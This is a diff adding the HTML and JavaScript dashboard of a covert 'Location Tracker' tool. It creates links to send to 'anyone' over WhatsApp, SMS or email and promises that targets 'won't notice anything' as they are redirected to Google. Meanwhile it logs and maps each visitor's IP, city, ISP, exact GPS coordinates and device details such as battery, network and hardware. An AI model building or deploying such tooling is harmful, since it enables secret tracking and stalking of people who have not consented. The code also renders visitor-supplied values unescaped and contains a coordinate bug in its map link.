@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Location Tracker Dashboard</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:'Segoe UI',sans-serif;background:#f0f4f8;padding:20px}
+    .wrapper{max-width:740px;margin:0 auto}
+    h1{font-size:22px;font-weight:700;color:#1a202c;margin-bottom:4px}
+    .subtitle{font-size:14px;color:#718096;margin-bottom:20px}
+    .card{background:#fff;border-radius:14px;padding:20px 24px;
+          box-shadow:0 2px 12px rgba(0,0,0,0.07);margin-bottom:16px}
+    .section-title{font-size:11px;text-transform:uppercase;letter-spacing:.06em;
+                   color:#a0aec0;font-weight:600;margin-bottom:14px}
+    .tabs{display:flex;gap:6px;margin-bottom:16px;flex-wrap:wrap}
+    .tab{padding:8px 18px;border-radius:8px;border:1.5px solid #e2e8f0;
+         background:#fff;font-size:13px;font-weight:500;cursor:pointer;color:#718096}
+    .tab.active{background:#667eea;color:#fff;border-color:#667eea}
+    .panel{display:none}
+    .panel.active{display:block}
+    input[type=text]{width:100%;padding:10px 14px;border:1.5px solid #e2e8f0;
+                     border-radius:8px;font-size:14px;margin-bottom:10px;outline:none}
+    input:focus{border-color:#667eea}
+    button{padding:10px 20px;border:none;border-radius:8px;font-size:14px;font-weight:500;cursor:pointer}
+    .btn-primary{background:#667eea;color:#fff}
+    .btn-red{background:#fc8181;color:#fff}
+    button:hover{opacity:.88}
+    .link-box{background:#f7fafc;border:1.5px dashed #667eea;border-radius:10px;
+              padding:14px 16px;font-family:monospace;font-size:12px;
+              color:#2d3748;word-break:break-all;margin:10px 0;display:none}
+    .copy-btn{background:#ebf4ff;color:#3182ce;border:none;border-radius:6px;
+              padding:6px 14px;font-size:12px;cursor:pointer;font-weight:500;margin-top:6px}
+    .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:10px}
+    .info-item{background:#f7fafc;border-radius:8px;padding:10px 12px}
+    .info-label{font-size:11px;color:#a0aec0;text-transform:uppercase;margin-bottom:3px}
+    .info-value{font-size:13px;font-weight:600;color:#2d3748;word-break:break-all}
+    .log-entry{border:1.5px solid #e2e8f0;border-radius:10px;padding:14px;margin-bottom:12px}
+    .log-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;flex-wrap:wrap;gap:6px}
+    .empty-state{text-align:center;padding:32px;color:#a0aec0;font-size:14px}
+    .badge{display:inline-block;padding:2px 8px;border-radius:20px;font-size:11px;font-weight:600;margin-right:4px}
+    .badge-ip{background:#ebf4ff;color:#3182ce}
+    .badge-gps{background:#f0fff4;color:#276749}
+    iframe{width:100%;height:220px;border:none;border-radius:10px;margin-top:10px}
+    .status{padding:10px 14px;border-radius:8px;font-size:13px;margin-top:8px}
+    .loading{background:#ebf8ff;color:#2b6cb0}
+    .success{background:#f0fff4;color:#276749}
+    .error{background:#fff5f5;color:#c53030}
+    .highlight{background:#fffbeb;border-left:4px solid #f6ad55;border-radius:8px;
+               padding:12px 16px;font-size:13px;color:#744210;line-height:1.7;margin-top:10px}
+    .refresh-note{font-size:12px;color:#a0aec0;margin-top:6px}
+    @media(max-width:500px){.info-grid{grid-template-columns:1fr}}
+  </style>
+</head>
+<body>
+<div class="wrapper">
+  <h1>🔗 Location Tracker Dashboard</h1>
+  <p class="subtitle">Real server — send links to anyone, see their location</p>
+
+  <div class="tabs">
+    <button class="tab active" onclick="showTab('create',this)">1️⃣ Create Link</button>
+    <button class="tab"        onclick="showTab('logs',this)">2️⃣ View Logs</button>
+  </div>
+
+  <!-- CREATE -->
+  <div id="tab-create" class="panel active">
+    <div class="card">
+      <p class="section-title">Create a tracking link</p>
+      <input type="text" id="linkName" placeholder="Give it a name (e.g. WhatsApp Test, Friend Test)"/>
+      <button class="btn-primary" onclick="createLink()">🔗 Generate Link</button>
+      <div id="createStatus"></div>
+
+      <div class="link-box" id="linkBox">
+        <div style="font-size:11px;color:#a0aec0;margin-bottom:4px">YOUR TRACKING LINK — send this to anyone</div>
+        <div id="linkText"></div>
+        <button class="copy-btn" id="copyBtn">📋 Copy Link</button>
+      </div>
+
+      <div class="highlight" id="linkHint" style="display:none">
+        👆 <strong>This is a real link!</strong><br>
+        Send it on WhatsApp, SMS, or email to your friend.<br>
+        When they click it → their IP + GPS is captured → you see it in <strong>View Logs</strong> tab.<br>
+        The page shows a spinner then redirects them to Google — they won't notice anything.
+      </div>
+    </div>
+  </div>
+
+  <!-- LOGS -->
+  <div id="tab-logs" class="panel">
+    <div class="card">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;flex-wrap:wrap;gap:8px">
+        <div>
+          <p class="section-title" style="margin-bottom:2px">Visitor Logs</p>
+          <span id="logCount" style="font-size:13px;color:#718096">Loading...</span>
+        </div>
+        <div style="display:flex;gap:8px">
+          <button class="btn-primary" onclick="loadLogs()" style="padding:6px 14px;font-size:12px">🔄 Refresh</button>
+          <button class="btn-red"     onclick="clearLogs()" style="padding:6px 14px;font-size:12px">🗑 Clear</button>
+        </div>
+      </div>
+      <p class="refresh-note">Auto-refreshes every 5 seconds</p>
+      <div id="logContainer" style="margin-top:12px">
+        <div class="empty-state">Loading logs...</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+function showTab(name, el) {
+  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
+  document.getElementById('tab-'+name).classList.add('active');
+  el.classList.add('active');
+  if(name==='logs') loadLogs();
+}
+
+async function createLink() {
+  const name = document.getElementById('linkName').value.trim() || 'My Link';
+  const statusEl = document.getElementById('createStatus');
+  statusEl.innerHTML = '<div class="status loading">⏳ Creating link...</div>';
+  try {
+    const res  = await fetch('/api/create', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({name})
+    });
+    const data = await res.json();
+    statusEl.innerHTML = '';
+    document.getElementById('linkBox').style.display  = 'block';
+    document.getElementById('linkHint').style.display = 'block';
+    document.getElementById('linkText').textContent   = data.trackUrl;
+    document.getElementById('copyBtn').onclick = () => {
+      navigator.clipboard.writeText(data.trackUrl).then(()=>{
+        document.getElementById('copyBtn').textContent = '✅ Copied!';
+        setTimeout(()=>document.getElementById('copyBtn').textContent='📋 Copy Link',2000);
+      });
+    };
+  } catch(e) {
+    statusEl.innerHTML = `<div class="status error">❌ Error: ${e.message}</div>`;
+  }
+}
+
+async function loadLogs() {
+  try {
+    const logs = await fetch('/api/logs').then(r=>r.json());
+    renderLogs(logs);
+  } catch(e) {
+    document.getElementById('logContainer').innerHTML =
+      '<div class="empty-state">❌ Could not load logs</div>';
+  }
+}
+
+function renderLogs(logs) {
+  document.getElementById('logCount').textContent =
+    `${logs.length} visitor${logs.length!==1?'s':''} logged`;
+
+  const container = document.getElementById('logContainer');
+  if(logs.length===0){
+    container.innerHTML='<div class="empty-state">📭 No logs yet.<br><br>Create a link and send it to someone!</div>';
+    return;
+  }
+
+  container.innerHTML = logs.map(log=>{
+    const hasGPS = !!log.gps;
+    const lat    = hasGPS ? log.gps.lat : (log.ipLoc?log.ipLoc.split(',')[0]:'17.38');
+    const lon    = hasGPS ? log.gps.lon : (log.ipLoc?log.ipLoc.split(',')[1]:'78.49');
+    const zoom   = hasGPS ? 0.004 : 0.4;
+    const mapSrc = `https://www.openstreetmap.org/export/embed.html?bbox=${parseFloat(lon)-zoom},${parseFloat(lat)-zoom},${parseFloat(lon)+zoom},${parseFloat(lon)+zoom}&layer=mapnik&marker=${lat},${lon}`;
+
+    // Parse browser/OS from user-agent string
+    const ua = log.browser || '';
+    const browser = ua.includes('Edg')?'Edge':ua.includes('Chrome')?'Chrome':ua.includes('Firefox')?'Firefox':ua.includes('Safari')?'Safari':'Other';
+    const os      = ua.includes('Windows')?'Windows':ua.includes('Android')?'Android':ua.includes('iPhone')?'iOS':ua.includes('Mac')?'Mac':'Other';
+    const device  = /Mobile|Android|iPhone/i.test(ua)?'📱 Mobile':'💻 Desktop';
+
+    // Helper parser for Opened from referrer
+    const parseReferrer = (ref) => {
+      if (!ref || ref === '' || ref === '—') return null;
+      const lower = ref.toLowerCase();
+      if (lower.includes('whatsapp') || lower.includes('wa.me')) return 'WhatsApp';
+      if (lower.includes('telegram') || lower.includes('t.me') || lower.includes('org.telegram')) return 'Telegram';
+      if (lower.includes('mail.google.com') || lower.includes('gmail')) return 'Gmail';
+      if (lower.includes('messaging') || lower.includes('sms') || lower.includes('mms') || lower.includes('android.apps.messaging')) return 'SMS';
+      return 'Other';
+    };
+
+    const serverRef = log.referrer;
+    const clientRef = log.browserReferrer;
+    let openedFrom = 'Direct';
+
+    const parsedServer = parseReferrer(serverRef);
+    const parsedClient = parseReferrer(clientRef);
+
+    if (parsedServer) {
+      openedFrom = parsedServer;
+    } else if (parsedClient) {
+      openedFrom = parsedClient;
+    } else if ((serverRef && serverRef !== '—') || (clientRef && clientRef !== '')) {
+      openedFrom = 'Other';
+    }
+
+    const langDisplay = log.deviceLanguage || (log.acceptLanguage && log.acceptLanguage !== '—' ? log.acceptLanguage.split(',')[0] : '—');
+    const cpuDisplay = log.cpuCores ? `${log.cpuCores} Cores` : '—';
+    const ramDisplay = log.deviceMemory ? `${log.deviceMemory} GB` : '—';
+    
+    let networkDisplay = '—';
+    if (log.networkType || log.networkSpeed) {
+      const parts = [];
+      if (log.networkType) parts.push(log.networkType.toUpperCase());
+      if (log.networkSpeed) parts.push(`${log.networkSpeed} Mbps`);
+      networkDisplay = parts.join(' · ');
+    }
+
+    let batteryDisplay = '—';
+    if (log.batteryLevel !== undefined && log.batteryLevel !== null) {
+      batteryDisplay = `${log.batteryLevel}% (${log.batteryCharging ? 'Charging' : 'Discharging'})`;
+    }
+
+    const touchDisplay = log.touchSupport === undefined ? '—' : (log.touchSupport ? 'Yes' : 'No');
+
+    return `
+      <div class="log-entry">
+        <div class="log-header">
+          <strong style="font-size:14px">🔗 ${log.linkName}</strong>
+          <span style="font-size:12px;color:#a0aec0">${log.time}</span>
+        </div>
+        <div class="info-grid">
+          <div class="info-item"><div class="info-label">IP Address</div><div class="info-value">${log.ip}</div></div>
+          <div class="info-item"><div class="info-label">City / Region</div><div class="info-value">${log.city}, ${log.region}</div></div>
+          <div class="info-item"><div class="info-label">Country</div><div class="info-value">${log.country}</div></div>
+          <div class="info-item"><div class="info-label">ISP / Org</div><div class="info-value">${log.isp}</div></div>
+          <div class="info-item"><div class="info-label">Device</div><div class="info-value">${device} · ${os}</div></div>
+          <div class="info-item"><div class="info-label">Browser</div><div class="info-value">${browser}</div></div>
+          ${hasGPS?`
+          <div class="info-item" style="background:#f0fff4;grid-column:span 2">
+            <div class="info-label">📡 GPS — Exact Location</div>
+            <div class="info-value">Lat: ${log.gps.lat} | Lon: ${log.gps.lon} | ±${log.gps.accuracy}m</div>
+          </div>`:`
+          <div class="info-item" style="background:#fff5f5;grid-column:span 2">
+            <div class="info-label">GPS</div>
+            <div class="info-value">Not allowed — IP location only</div>
+          </div>`}
+        </div>
+        
+        <!-- Device Intelligence section -->
+        <div style="margin-top:16px;margin-bottom:8px">
+          <div style="font-size:11px;text-transform:uppercase;letter-spacing:.06em;color:#a0aec0;font-weight:600;margin-bottom:8px">Device Intelligence</div>
+          <div class="info-grid">
+            <div class="info-item"><div class="info-label">Screen Resolution</div><div class="info-value">${log.screenResolution || '—'}</div></div>
+            <div class="info-item"><div class="info-label">Timezone</div><div class="info-value">${log.timezone || '—'}</div></div>
+            <div class="info-item"><div class="info-label">Language</div><div class="info-value">${langDisplay}</div></div>
+            <div class="info-item"><div class="info-label">CPU Cores</div><div class="info-value">${cpuDisplay}</div></div>
+            <div class="info-item"><div class="info-label">RAM (device memory)</div><div class="info-value">${ramDisplay}</div></div>
+            <div class="info-item"><div class="info-label">Network type and speed</div><div class="info-value">${networkDisplay}</div></div>
+            <div class="info-item"><div class="info-label">Battery % and charging status</div><div class="info-value">${batteryDisplay}</div></div>
+            <div class="info-item"><div class="info-label">Touch device (yes/no)</div><div class="info-value">${touchDisplay}</div></div>
+            <div class="info-item" style="grid-column:span 2"><div class="info-label">Opened From</div><div class="info-value">${openedFrom}</div></div>
+          </div>
+        </div>
+
+        <div style="margin-top:8px">
+          <span class="badge badge-ip">📍 ${log.city}</span>
+          ${hasGPS?`<span class="badge badge-gps">📡 GPS ±${log.gps.accuracy}m</span>`:''}
+        </div>
+        <iframe src="${mapSrc}" title="map"></iframe>
+      </div>`;
+  }).join('');
+}
+
+async function clearLogs() {
+  if(!confirm('Clear all logs?')) return;
+  await fetch('/api/logs',{method:'DELETE'});
+  loadLogs();
+}
+
+// Auto-refresh logs every 5 seconds when on logs tab
+setInterval(()=>{
+  if(document.getElementById('tab-logs').classList.contains('active')) loadLogs();
+}, 5000);
+</script>
+</body>
+</html>
